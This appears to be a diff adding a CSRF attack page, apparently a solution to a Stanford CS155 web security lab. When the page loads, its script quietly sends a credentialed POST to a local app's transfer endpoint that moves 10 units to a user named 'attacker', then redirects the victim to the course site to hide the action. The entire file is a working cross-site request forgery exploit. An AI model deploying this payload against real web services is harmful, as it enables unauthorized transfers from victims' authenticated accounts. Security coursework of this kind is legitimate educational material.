@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+        let transfer_form_data = 'destination_username=attacker&quantity=10';
+        let xml_http_request = new XMLHttpRequest();
+        xml_http_request.withCredentials=true;
+        xml_http_request.open('POST', 'http://localhost:3000/post_transfer');
+        xml_http_request.onload = function() {
+            window.location = 'https://cs155.stanford.edu';
+        }
+        xml_http_request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xml_http_request.send(transfer_form_data);
+        </script>
+    </head>
+    <body>
+    </body>
+</html>
